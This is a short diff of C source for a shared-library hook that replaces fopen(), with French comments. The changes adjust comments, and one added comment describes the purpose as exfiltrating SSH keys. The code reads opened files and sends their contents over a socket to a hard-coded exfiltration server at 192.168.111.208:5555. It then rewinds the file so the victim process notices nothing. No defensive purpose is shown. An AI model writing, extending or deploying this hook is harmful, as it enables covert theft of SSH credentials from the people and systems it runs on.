@@ -9,7 +9,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define EXFIL_SERVER "192.168.111.208"  // Adresse IP du serveur d'exfiltration
+#define EXFIL_SERVER "192.168.111.208" 
 #define EXFIL_PORT 5555
 
 static FILE *(*original_fopen)(const char *pathname, const char *mode) = NULL;
@@ -29,6 +29,7 @@ void send_to_exfil_server(const char *data, size_t len) {
     close(sock);
 }
 
+// fopen() pour exfiltration des clés SSH
 FILE *fopen(const char *pathname, const char *mode) {
     if (!original_fopen) original_fopen = dlsym(RTLD_NEXT, "fopen");
 
@@ -44,7 +45,7 @@ FILE *fopen(const char *pathname, const char *mode) {
             send_to_exfil_server(buffer, bytes_read);
         }
 
-        rewind(fp);  // Permet au vrai processus de lire normalement
+        rewind(fp);
         return fp;
     }
 
